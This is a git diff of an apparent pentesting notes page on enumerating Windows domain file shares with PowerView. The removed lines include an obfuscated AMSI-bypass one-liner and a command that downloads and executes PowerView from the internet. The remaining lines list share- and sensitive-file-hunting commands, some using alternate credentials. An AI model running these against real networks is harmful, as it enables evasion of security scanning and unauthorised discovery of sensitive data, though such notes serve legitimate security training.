@@ -1,7 +1,7 @@
 ---
 title: "Files and Shares"
-description: "Enumerating files & shares."
-lead: "Enumerating files & shares using PowerView."
+description: "Enumerating files & Shares with PowerView."
+lead: "Enumerating files & Shares using PowerView."
 date: 2021-11-07T18:20:24+01:00
 lastmod: 2021-11-07T18:20:24+01:00
 draft: false
@@ -13,46 +13,47 @@ weight: 90
 toc: true
 ---
 
-## PowerView
-
-### Setup
+## Find Shares on hosts in current Domain
 
 ```powershell
-# If it gets blocked by AMSI we can bypass it with
-S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
-
-# Then load the module
-Import-Module .\PowerView.ps1
-. .\PowerView.ps1
-
-# With internet access
-iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1')
+Invoke-ShareFinder -Verbose
 ```
 
-### Commands
+## Find Shares from other Domain
 
 ```powershell
-# Find shares on hosts in current domain
-Invoke-ShareFinder -Verbose
-
-# Find shares from other domain
 Invoke-ShareFinder -Domain lab.local
+```
 
-# Exclude default shares
+## Exclude default Shares
+
+```powershell
 Invoke-ShareFinder -ExcludeStandard
+```
 
-# Show only shares the current user has access to
+## Show only Shares the current User has Access to
+
+```powershell
 Invoke-ShareFinder -CheckShareAccess
+```
 
-# Find sensitive files on computers in the domain
+## Find sensitive Files on Computers
+
+```powershell
 Invoke-FileFinder -Verbose
+```
 
-# Get all fileservers of the domain
+## Get all Fileservers
+
+```powershell
 Get-NetFileServer
+```
 
-# use alternate credentials for searching for files on the domain
+## Use alternate Credentials when searching for Files
+
+```powershell
 # Find-InterestingDomainShareFile == old Invoke-FileFinder
 $Password = "PASSWORD" | ConvertTo-SecureString -AsPlainText -Force
 $Credential = New-Object System.Management.Automation.PSCredential("DOMAIN\user",$Password)
-Find-InterestingDomainShareFile -Domain DOMAIN -Credential $Credential
+Find-InterestingDomainShareFile -Domain Domain -Credential $Credential
 ```
